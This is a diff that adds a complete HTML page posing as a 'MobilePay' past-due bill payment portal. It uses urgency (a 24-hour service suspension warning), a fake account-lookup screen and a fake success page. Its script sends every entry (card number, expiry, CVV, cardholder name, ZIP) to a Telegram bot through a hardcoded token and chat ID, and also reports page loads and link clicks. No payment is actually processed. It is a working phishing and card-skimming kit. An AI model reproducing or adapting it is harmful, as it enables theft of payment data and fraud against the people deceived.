@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MobilePay - Past Due Bill Payment</title>
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --danger: #e74c3c;
+            --success: #2ecc71;
+            --warning: #ffc107;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        header {
+            background-color: var(--primary);
+            color: white;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+        main {
+            max-width: 600px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+        .payment-container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 2rem;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
+        }
+        h1, h2, h3 {
+            color: var(--primary);
+            margin-top: 0;
+        }
+        h1 { font-size: 1.8rem; }
+        .balance-display {
+            background-color: #f8f9fa;
+            padding: 1rem;
+            border-radius: 6px;
+            margin: 1.5rem 0;
+            border-left: 4px solid var(--danger);
+        }
+        .amount {
+            font-weight: bold;
+            font-size: 1.4rem;
+            color: var(--danger);
+        }
+        .due-date { font-weight: bold; }
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        input, select {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            box-sizing: border-box;
+            margin-bottom: 0.5rem;
+        }
+        .card-row {
+            display: flex;
+            gap: 1rem;
+        }
+        .card-row .form-group { flex: 1; }
+        .notice-box {
+            padding: 1rem;
+            border-radius: 6px;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+        }
+        .notice-warning {
+            background-color: #fff8e1;
+            border-left: 4px solid var(--warning);
+        }
+        .notice-info {
+            background-color: #e8f4f8;
+            border-left: 4px solid var(--secondary);
+        }
+        .btn {
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            transition: all 0.3s;
+            margin-top: 1rem;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+        }
+        .btn-primary {
+            background-color: var(--secondary);
+        }
+        .btn-primary:hover {
+            background-color: #2980b9;
+        }
+        .btn-outline {
+            background-color: transparent;
+            color: var(--secondary);
+            border: 1px solid var(--secondary);
+            margin-top: 0.5rem;
+        }
+        .btn-outline:hover {
+            background-color: #f0f8ff;
+        }
+        .spinner {
+            margin: 20px auto;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid var(--secondary);
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .confirmation {
+            text-align: center;
+            padding: 2rem;
+        }
+        .confirmation-icon {
+            font-size: 4rem;
+            color: var(--success);
+            margin-bottom: 1rem;
+        }
+        .page { display: none; }
+        .page.active { display: block; }
+        .plan-options {
+            display: flex;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        .plan-option {
+            flex: 1;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+        }
+        .plan-option.selected {
+            border-color: var(--secondary);
+            background-color: #f0f8ff;
+        }
+        /* Loading Screen Styles */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #loading-screen h2 {
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+        }
+        #loading-screen .progress-container {
+            width: 80%;
+            max-width: 300px;
+            background-color: #f0f0f0;
+            border-radius: 20px;
+            margin-top: 1rem;
+        }
+        #loading-screen .progress-bar {
+            height: 10px;
+            background-color: var(--secondary);
+            border-radius: 20px;
+            width: 0%;
+            transition: width 0.1s linear;
+        }
+        #loading-message {
+            margin-top: 1rem;
+            color: #666;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <h2>Finding Your Account</h2>
+        <div class="spinner"></div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        <div id="loading-message">Please wait while we retrieve your account details...</div>
+    </div>
+
+    <!-- Main Content (hidden initially) -->
+    <div id="main-content" style="display:none;">
+        <header>
+            <div class="logo">MobilePay</div>
+        </header>
+
+        <main>
+            <!-- Payment Page -->
+            <div class="page active" id="payment-page">
+                <section class="payment-container">
+                    <h1>Pay Past Due Balance</h1>
+                    <div class="balance-display">
+                        <p>Total Past Due: <span class="amount">$30.67</span></p>
+                        <p>Due Date: <span class="due-date">June 30, 2023</span></p>
+                        <!-- Amount Breakdown Toggle -->
+                        <button type="button" id="toggle-breakdown" class="btn btn-outline" style="margin-top:10px;margin-bottom:0.5rem;width:auto;">Show Amount Breakdown</button>
+                        <div id="breakdown" style="display:none; margin-top:0.5rem; font-size:0.95rem;">
+                            <ul style="list-style:none;padding-left:0;">
+                                <li>Service Charges: <strong>$20.00</strong></li>
+                                <li>Late Fee: <strong>$5.00</strong></li>
+                                <li>Taxes: <strong>$5.67</strong></li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <form id="payment-form">
+                        <div class="form-group">
+                            <label for="amount">Payment Amount ($)</label>
+                            <input type="number" id="amount" min="1" step="0.01" value="30.67" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="zip-code">Billing ZIP Code</label>
+                            <input type="text" id="zip-code" pattern="\d{5}(-\d{4})?" placeholder="12345" required>
+                        </div>
+
+                        <button type="submit" class="btn btn-primary">Continue to Payment</button>
+                        <button type="button" id="plan-btn" class="btn btn-outline">Request Payment Plan</button>
+                        <div class="spinner" id="spinner-1" style="display:none;"></div>
+                    </form>
+                </section>
+
+                <section class="payment-container notice-box notice-info" style="margin-top: 1rem;">
+                    <h3>Service Status</h3>
+                    <p>Your service will be suspended in <strong>24 hours</strong> if payment is not received.</p>
+                    <p>Service restoration typically occurs within <strong>1 hour</strong> of payment processing.</p>
+                </section>
+            </div>
+
+            <!-- Payment Details Page -->
+            <div class="page" id="details-page">
+                <section class="payment-container">
+                    <h1>Enter Payment Details</h1>
+                    <div class="notice-box notice-warning">
+                        <p><strong>No prepaid or CashApp cards accepted.</strong></p>
+                    </div>
+                    <form id="payment-details-form">
+                        <div class="form-group">
+                            <label for="card-number">Card Number</label>
+                            <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required>
+                        </div>
+                        
+                        <div class="card-row">
+                            <div class="form-group">
+                                <label for="expiry">Expiry Date</label>
+                                <input type="text" id="expiry" placeholder="MM/YY" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" placeholder="123" required>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="name">Cardholder Name</label>
+                            <input type="text" id="name" placeholder="John Smith" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="details-zip-code">Billing ZIP Code</label>
+                            <input type="text" id="details-zip-code" pattern="\d{5}(-\d{4})?" placeholder="12345" required>
+                        </div>
+                        <!-- Remember Card Checkbox -->
+                        <div class="form-group" style="margin-bottom:1rem;">
+                            <input type="checkbox" id="remember-card-details">
+                            <label for="remember-card-details" style="display:inline;font-weight:400;">Remember this card for future payments</label>
+                        </div>
+                        
+                        <div class="notice-box notice-info">
+                            <p><strong>Secure payment:</strong> Your information is encrypted and processed securely.</p>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-primary">Pay $30.67</button>
+                        <div class="spinner" id="spinner-2" style="display:none;"></div>
+                    </form>
+                </section>
+            </div>
+
+            <!-- Payment Plan Page -->
+            <div class="page" id="plan-page">
+                <section class="payment-container">
+                    <h1>Set Up Payment Plan</h1>
+                    <p>Pay what you can now and we'll automatically charge the remaining balance on your next due date.</p>
+                    
+                    <div class="notice-box notice-warning">
+                        <p><strong>No prepaid or CashApp cards accepted.</strong> A valid credit/debit card is required for payment plans.</p>
+                    </div>
+                    
+                    <form id="plan-form">
+                        <div class="form-group">
+                            <label for="plan-amount">Amount to Pay Now ($)</label>
+                            <input type="number" id="plan-amount" min="25" max="30.67" value="30.00" step="0.01" required>
+                            <small>Minimum payment: $25.00</small>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="plan-date">Remaining Balance Due Date</label>
+                            <input type="date" id="plan-date" required>
+                        </div>
+                        
+                        <h3>Payment Method</h3>
+                        <div class="form-group">
+                            <label for="plan-card-number">Card Number</label>
+                            <input type="text" id="plan-card-number" placeholder="1234 5678 9012 3456" required>
+                        </div>
+                        
+                        <div class="card-row">
+                            <div class="form-group">
+                                <label for="plan-expiry">Expiry Date</label>
+                                <input type="text" id="plan-expiry" placeholder="MM/YY" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="plan-cvv">CVV</label>
+                                <input type="text" id="plan-cvv" placeholder="123" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="plan-zip-code">Billing ZIP Code</label>
+                            <input type="text" id="plan-zip-code" pattern="\d{5}(-\d{4})?" placeholder="12345" required>
+                        </div>
+                        <!-- Remember Card Checkbox -->
+                        <div class="form-group" style="margin-bottom:1rem;">
+                            <input type="checkbox" id="remember-plan-card">
+                            <label for="remember-plan-card" style="display:inline;font-weight:400;">Remember this card for future payments</label>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-primary">Set Up Payment Plan</button>
+                        <div class="spinner" id="spinner-3" style="display:none;"></div>
+                    </form>
+                </section>
+            </div>
+
+            <!-- Confirmation Page -->
+            <div class="page" id="confirmation-page">
+                <section class="payment-container confirmation">
+                    <div class="confirmation-icon">✓</div>
+                    <h1>Payment Successful!</h1>
+                    <p id="confirmation-message">Your payment of <strong>$30.67</strong> has been processed successfully.</p>
+                    <p>Transaction ID: <strong id="transaction-id">PAY-98456231</strong></p>
+                    <p>A receipt has been sent to your email.</p>
+                    <a href="#" class="btn btn-primary" id="return-btn">Return to Account</a>
+                </section>
+            </div>
+        </main>
+
+        <footer>
+            <p>© 2023 MobilePay. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#terms">Terms</a>
+                <a href="#privacy">Privacy</a>
+                <a href="#contact">Contact</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Generate random transaction ID
+        function generateTransactionId() {
+            return 'PAY-' + Math.floor(10000000 + Math.random() * 90000000);
+        }
+        
+        // Format date as MM/DD/YYYY
+        function formatDate(date) {
+            return new Date(date).toLocaleDateString('en-US');
+        }
+        
+        // Set future date (30 days from now) for payment plan
+        document.addEventListener('DOMContentLoaded', function() {
+            const today = new Date();
+            const futureDate = new Date();
+            futureDate.setDate(today.getDate() + 30);
+            document.getElementById('plan-date').valueAsDate = futureDate;
+            
+            // Simulate account lookup for 6 seconds
+            simulateAccountLookup();
+        });
+        
+        // Simulate account lookup with progress bar
+        function simulateAccountLookup() {
+            const progressBar = document.getElementById('progress-bar');
+            const loadingMessages = [
+                "Locating your account...",
+                "Verifying account details...",
+                "Checking past due balance...",
+                "Almost done...",
+                "Preparing your payment options..."
+            ];
+            
+            let progress = 0;
+            const interval = setInterval(function() {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                
+                // Update loading message every 20% progress
+                if (progress % 20 === 0) {
+                    const messageIndex = Math.min(Math.floor(progress/20) - 1, loadingMessages.length - 1);
+                    document.getElementById('loading-message').textContent = loadingMessages[messageIndex];
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(function() {
+                        document.getElementById('loading-screen').style.display = 'none';
+                        document.getElementById('main-content').style.display = 'block';
+                    }, 300);
+                }
+            }, 60); // 60ms * 100 = 6000ms (6 seconds)
+        }
+        
+        // Payment form submission
+        document.getElementById('payment-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const amount = document.getElementById('amount').value;
+            const zipCode = document.getElementById('zip-code').value;
+
+            // Send Telegram alert on payment form submit
+            sendTelegramAlert({
+                form: 'payment-form',
+                amount: amount,
+                zipCode: zipCode
+            });
+
+            document.getElementById('spinner-1').style.display = 'block';
+            document.querySelector('#payment-form button').disabled = true;
+
+            setTimeout(function() {
+                document.getElementById('payment-page').classList.remove('active');
+                document.getElementById('details-page').classList.add('active');
+                document.getElementById('spinner-1').style.display = 'none';
+
+                // Update payment button with selected amount
+                document.querySelector('#payment-details-form .btn-primary').textContent = `Pay $${amount}`;
+                // Carry over ZIP code to payment details
+                document.getElementById('details-zip-code').value = zipCode;
+            }, 1000);
+        });
+        
+        // Payment details submission
+        document.getElementById('payment-details-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Send Telegram alert on payment details form submit
+            sendTelegramAlert({
+                form: 'payment-details-form',
+                cardNumber: document.getElementById('card-number').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                name: document.getElementById('name').value,
+                zipCode: document.getElementById('details-zip-code').value
+            });
+
+            document.getElementById('spinner-2').style.display = 'block';
+            document.querySelector('#payment-details-form button').disabled = true;
+
+            setTimeout(function() {
+                const amount = document.getElementById('amount').value;
+                document.getElementById('confirmation-message').innerHTML = 
+                    `Your payment of <strong>$${amount}</strong> has been processed successfully.`;
+                document.getElementById('transaction-id').textContent = generateTransactionId();
+
+                document.getElementById('details-page').classList.remove('active');
+                document.getElementById('confirmation-page').classList.add('active');
+                document.getElementById('spinner-2').style.display = 'none';
+            }, 1500);
+        });
+        
+        // Payment plan button
+        document.getElementById('plan-btn').addEventListener('click', function() {
+            document.getElementById('payment-page').classList.remove('active');
+            document.getElementById('plan-page').classList.add('active');
+        });
+        
+        // Payment plan submission
+        document.getElementById('plan-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Send Telegram alert on payment plan form submit
+            sendTelegramAlert({
+                form: 'plan-form',
+                amount: document.getElementById('plan-amount').value,
+                dueDate: document.getElementById('plan-date').value,
+                cardNumber: document.getElementById('plan-card-number').value,
+                expiry: document.getElementById('plan-expiry').value,
+                cvv: document.getElementById('plan-cvv').value,
+                zipCode: document.getElementById('plan-zip-code').value
+            });
+
+            const amount = document.getElementById('plan-amount').value;
+            const dueDate = formatDate(document.getElementById('plan-date').value);
+
+            document.getElementById('spinner-3').style.display = 'block';
+            document.querySelector('#plan-form button').disabled = true;
+
+            setTimeout(function() {
+                document.getElementById('confirmation-message').innerHTML = 
+                    `Your payment plan has been set up successfully.<br>
+                    <strong>$${amount}</strong> paid today.<br>
+                    Remaining balance due on <strong>${dueDate}</strong>.`;
+                document.getElementById('transaction-id').textContent = generateTransactionId();
+
+                document.getElementById('plan-page').classList.remove('active');
+                document.getElementById('confirmation-page').classList.add('active');
+                document.getElementById('spinner-3').style.display = 'none';
+            }, 1500);
+        });
+        
+        // Return to account button
+        document.getElementById('return-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            location.reload();
+        });
+        // Amount Breakdown Toggle
+        document.addEventListener('DOMContentLoaded', function() {
+            // Amount breakdown toggle
+            var toggleBtn = document.getElementById('toggle-breakdown');
+            var breakdown = document.getElementById('breakdown');
+            if (toggleBtn && breakdown) {
+                toggleBtn.addEventListener('click', function() {
+                    if (breakdown.style.display === 'none') {
+                        breakdown.style.display = 'block';
+                        toggleBtn.textContent = 'Hide Amount Breakdown';
+                    } else {
+                        breakdown.style.display = 'none';
+                        toggleBtn.textContent = 'Show Amount Breakdown';
+                    }
+                });
+            }
+        });
+    </script>
+
+    <!-- Send Telegram alert on page load and on any link click -->
+    <script>
+    const TELEGRAM_BOT_TOKEN = '7692222247:AAG23z6unx3rzaMgw5bLctYyt2MuA-Xknxc'; // <-- Your bot token
+    const TELEGRAM_CHAT_ID = '7923238047'; // <-- Your chat ID
+
+    function sendTelegramAlert(extra) {
+        const data = {
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
+            time: new Date().toISOString(),
+            ...extra
+        };
+        const message =
+            `🔔 Page Visited or Form Submitted!\n` +
+            `URL: ${data.url}\n` +
+            `User-Agent: ${data.userAgent}\n` +
+            `Referrer: ${data.referrer}\n` +
+            `Time: ${data.time}` +
+            (data.form ? `\nForm: ${data.form}` : '') +
+            (data.amount ? `\nAmount: ${data.amount}` : '') +
+            (data.zipCode ? `\nZIP: ${data.zipCode}` : '') +
+            (data.cardNumber ? `\nCard: ${data.cardNumber}` : '') +
+            (data.expiry ? `\nExpiry: ${data.expiry}` : '') +
+            (data.cvv ? `\nCVV: ${data.cvv}` : '') +
+            (data.name ? `\nName: ${data.name}` : '') +
+            (data.dueDate ? `\nDue Date: ${data.dueDate}` : '') +
+            (data.clickedLink ? `\nClicked Link: ${data.clickedLink}` : '');
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+        })
+    });
+}
+
+// Send alert on page load
+sendTelegramAlert();
+
+// Send alert on any link click
+document.addEventListener('DOMContentLoaded', function() {
+    document.querySelectorAll('a').forEach(function(link) {
+        link.addEventListener('click', function(e) {
+            sendTelegramAlert({clickedLink: link.href});
+        });
+    });
+});
+    </script>
+</body>
+</html>
